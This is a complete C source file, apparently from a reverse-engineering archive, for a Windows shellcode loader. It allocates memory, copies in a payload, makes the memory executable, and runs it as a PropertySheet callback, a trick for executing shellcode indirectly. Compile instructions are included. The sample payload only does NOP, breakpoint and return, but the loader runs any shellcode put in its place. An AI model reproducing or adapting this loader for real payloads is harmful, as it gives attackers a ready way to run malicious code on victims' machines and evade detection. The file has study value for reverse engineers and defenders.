/*
    Shellcode Loader
    Archive of Reversing.ID

    Abusing windows API to run shellcode as callback.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlMoveMemory
    - permission: VirtualProtect
    - execution:  PropertySheet
*/

#include <windows.h>
#include <stdint.h>

#pragma comment(lib,"comctl32")

int main ()
{
    void *  runtime;
    BOOL    retval;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t    payload_len = 4;

    PROPSHEETPAGE       psp[1];
    PROPSHEETHEADER     psh;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    RtlMoveMemory (runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        ZeroMemory ( psp, sizeof(PROPSHEETPAGE));
        psp[0].dwSize   = sizeof(PROPSHEETPAGE);
        psp[0].dwFlags  = PSP_DEFAULT | PSP_USETITLE;

        ZeroMemory (&psh, sizeof(PROPSHEETHEADER));
        psh.dwSize      = sizeof(PROPSHEETHEADER);
        psh.dwFlags     = PSH_PROPSHEETPAGE | PSH_USECALLBACK;
        psh.pfnCallback = (PFNPROPSHEETCALLBACK)runtime;
        psh.nPages      = 1;
        psh.ppsp        = (LPCPROPSHEETPAGE)psp;
        PropertySheet (&psh);
    }

    // deallocate the space
    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}